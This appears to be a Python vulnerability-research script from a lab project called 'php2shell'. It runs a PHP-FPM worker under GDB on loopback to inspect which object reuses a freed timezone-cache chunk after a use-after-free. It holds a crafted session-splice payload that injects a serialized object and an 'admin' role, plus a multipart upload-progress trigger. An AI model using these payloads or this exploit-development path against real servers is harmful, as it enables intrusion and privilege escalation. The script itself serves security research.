#!/usr/bin/env python3
"""Stage A FPM occupant fieldprobe (wake 24).

Bounded question left open after the FPM UAF was confirmed at rung 3: which
object reuses the freed 56-B startup tzcache chunk in an FPM worker, and do
its fields give the chosen-address-read precondition (pointer at +16, mask=0)?
This attaches GDB to the worker (follow-fork-mode child) of a plain affected
FPM build, captures DATEG(tzcache) at php_date.c:505 and dumps every
zend_hash_str_find_bucket (zend_hash.c:945) hit on the stale pointer at the
PRE-RINIT session warning.  Consumer precondition, per Stage B:

    nIndex = h | ht->nTableMask
    bucket = ((uint32_t*)arData)[(int32_t)nIndex]

so +16 must be a real pointer and +12 a controllable/zero mask.

Loopback only: php-fpm binds 127.0.0.1 and the request comes from the
committed FastCGI client.  No external systems contacted.

Usage: python3 lab/repro/php2shell-stageA-fpm-fieldprobe.py <php-fpm-bin> [outdir]
"""
import os
import pathlib
import shutil
import signal
import subprocess
import sys
import tempfile
import time

HERE = pathlib.Path(__file__).resolve().parent
CLIENT = HERE / 'php2shell-fpm-client.py'
SID = 'tzsplice'
OBJ = 'evil|O:8:"stdClass":1:{s:5:"proof";s:5:"pwned";}'
SPLICE = ('data|s:64:"' + 'A' * 88 + OBJ + 'B' * 32 +
          '";roles|a:1:{i:0;s:5:"admin";}')
BOUND = '---------------------------20896060251896012921717172737'
QUERIES = [('long10', 'XXX=ABCDEFGHIJ'), ('nested', 'XXX=0__ABCDEFGHIJ'),
           ('none', '')]

GDB = '''set pagination off
set confirm off
set auto-load safe-path /
set follow-fork-mode child
set detach-on-fork on
set $n = 0
break php_date.c:505
commands 1
  silent
  set $n = $n + 1
  set $st = date_globals.tzcache
  printf "STALE n=%d tc=%p flags=%08x mask=%08x arData=%p nNumUsed=%08x nNumOfEl=%08x\\n", $n, $st, *(unsigned int*)((char*)$st+8), *(unsigned int*)((char*)$st+12), *(void**)((char*)$st+16), *(unsigned int*)((char*)$st+24), *(unsigned int*)((char*)$st+28)
  x/7gx $st
  if $n >= 5
    printf "DONE\\n"
    quit
  end
  continue
end
run
quit
'''


def wait_port(port):
    import socket
    for _ in range(150):
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def run_case(fpm, out, port, label, query):
    d = pathlib.Path(tempfile.mkdtemp(prefix='fpm-fieldprobe-'))
    sess, www = d / 'sess', d / 'www'
    sess.mkdir(); www.mkdir()
    (sess / ('sess_' + SID)).write_text(SPLICE)
    (www / 'worker.php').write_text('<?php echo "worker\\n";')
    body = (('--%s\r\nContent-Disposition: form-data; '
             'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprog\r\n' % BOUND)
            + ('--%s\r\nContent-Disposition: form-data; name="file1"; '
               'filename="a.txt"\r\n\r\n1\r\n' % BOUND)
            + ('--%s--\r\n' % BOUND)).encode()
    (d / 'body').write_bytes(body)
    (d / 'probe.gdb').write_text(GDB)
    (d / 'fpm.conf').write_text(f'''[global]
error_log = {d}/fpm-error.log
daemonize = no
log_level = notice
pid = {d}/fpm.pid
process_control_timeout = 1

[www]
listen = 127.0.0.1:{port}
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
clear_env = no
env[USE_ZEND_ALLOC] = 0
env[USE_TRACKED_ALLOC] = 1
php_admin_value[memory_limit] = 16M
php_admin_value[max_execution_time] = 0
php_admin_value[max_input_vars] = 10000
php_admin_value[session.save_path] = {sess}
php_admin_value[session.name] = PHPSESSID
php_admin_value[session.use_strict_mode] = 0
php_admin_value[session.use_cookies] = 1
php_admin_value[session.cache_limiter] =
php_admin_value[session.upload_progress.enabled] = 1
php_admin_value[session.upload_progress.cleanup] = 0
php_admin_value[session.upload_progress.prefix] = upload_progress_
php_admin_value[session.upload_progress.name] = PHP_SESSION_UPLOAD_PROGRESS
php_admin_value[session.upload_progress.freq] = 1%
php_admin_value[session.upload_progress.min_freq] = 0.000000001
php_admin_value[file_uploads] = 1
php_admin_value[upload_max_filesize] = 1024
''')
    env = dict(os.environ)
    env.update(USE_ZEND_ALLOC='0', USE_TRACKED_ALLOC='1')
    gdbcmd = ['timeout', '50', 'gdb', '-q', '-batch', '-x', str(d / 'probe.gdb'),
              '--args', str(fpm), '-n', '-F', '-y', str(d / 'fpm.conf'),
              '-d', 'date.timezone=Bogus/Zone',
              '-d', f'error_log={d}/php-error.log', '-d', 'log_errors=1',
              '-d', 'error_reporting=32767', '-d', 'display_errors=0']
    log = out / f'fieldprobe-{label}.log'
    with (d / 'gdb.out').open('wb') as fo:
        gp = subprocess.Popen(gdbcmd, env=env, stdout=fo, stderr=subprocess.STDOUT,
                              start_new_session=True)
        try:
            # Give the worker time to initialise under GDB before the request.
            time.sleep(6)
            cc = [sys.executable, str(CLIENT), str(port), str(www / 'worker.php'),
                  '--param', 'QUERY_STRING=' + query,
                  '--param', 'CONTENT_TYPE=multipart/form-data; boundary=' + BOUND,
                  '--body', str(d / 'body'),
                  '--param', 'HTTP_COOKIE=PHPSESSID=' + SID]
            cp = subprocess.run(cc, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, timeout=15)
            (d / 'client.out').write_bytes(cp.stdout)
        finally:
            try:
                gp.wait(timeout=55)
            except subprocess.TimeoutExpired:
                os.killpg(gp.pid, signal.SIGKILL)
                gp.wait()
        text = (d / 'gdb.out').read_text(errors='replace')
        log.write_text('case=%s query=%r\n=== GDB ===\n%s\n' % (label, query, text))
    for lf in ('php-error.log', 'fpm-error.log', 'client.out'):
        p = d / lf
        if p.exists():
            with log.open('a') as fh:
                fh.write('\n=== %s ===\n%s\n' % (lf, p.read_text(errors='replace')[:3000]))
    shutil.rmtree(d, ignore_errors=True)
    hits = [l for l in log.read_text(errors='replace').splitlines()
            if l.startswith('STALE ')]
    print(f'{label}: stale_hits={len(hits)} log={log}')
    for h in hits:
        print('  ' + h)


def main():
    fpm = pathlib.Path(sys.argv[1]).resolve()
    out = pathlib.Path(sys.argv[2] if len(sys.argv) > 2
                       else 'lab/build/evidence/w24-fpm-fieldprobe')
    out.mkdir(parents=True, exist_ok=True)
    for i, (label, query) in enumerate(QUERIES):
        run_case(fpm, out, 18130 + i, label, query)


if __name__ == '__main__':
    main()
